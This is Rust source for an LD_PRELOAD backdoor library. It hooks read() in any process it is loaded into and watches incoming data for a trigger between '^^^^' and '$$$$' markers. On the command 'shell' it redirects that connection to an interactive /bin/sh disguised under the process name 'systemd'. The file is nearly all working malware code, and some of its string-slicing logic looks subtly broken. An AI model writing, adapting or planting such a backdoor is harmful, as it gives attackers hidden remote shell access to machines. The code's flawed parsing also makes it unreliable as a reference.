use std::os::raw::c_void;
use std::ffi::{CStr, CString};
use redhook::{real,hook};
use nix::unistd::{dup2, execv};
use std::env;

static HEAD: &str = "^^^^";
static TAIL: &str = "$$$$";

fn from_c_str(buf: *mut c_void) -> String {
    unsafe {CStr::from_ptr(buf as *const _)}.to_string_lossy().into_owned()
}

fn shell(fd: i32, _args: &[&str]) -> Result<String, nix::Error> {
    dup2(fd, 0)?;
    dup2(fd, 1)?;
    dup2(fd, 2)?;
    execv(&CString::new("/bin/sh").unwrap(), &[&CString::new("systemd").unwrap(), &CString::new("-i").unwrap()])?;
    Ok("success".to_string())
}

fn handle_cmd(cmd: &str, fd: i32) {
    println!("Received command: `{}'", cmd);
    let cmd = split_string(cmd, " ", 0);
    let args: &[&str] = &cmd.split(" ").collect::<Vec<&str>>()[1..];
    // Fork here
    if cmd == "shell" {
        shell(fd, args);
    }
}

pub fn split_string<'a>(s: &'a str, split: &str, offset: usize) -> &'a str {
    s.split(split).collect::<Vec<&str>>()[offset]
}

fn handle_hook(buf: &str, fd: i32) -> bool {
    if let Some(start) = buf.find(HEAD)  {
        if let Some(end) = buf[start..].find(TAIL) {
            env::set_var("LD_PRELOAD", "");
            handle_cmd(&buf[start+HEAD.len()..end], fd);
            return true;
        }
    } else {
        return false;
    }
    false
}

hook! {
    unsafe fn read(fd: i32, buf: *mut c_void, count: u32) -> i32 => my_read {
        let real_ret = real!(read)(fd, buf, count);
        if handle_hook(&from_c_str(buf), fd) {
            0
        } else {
            real_ret
         }
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        assert_eq!(2 + 2, 4);
    }
}
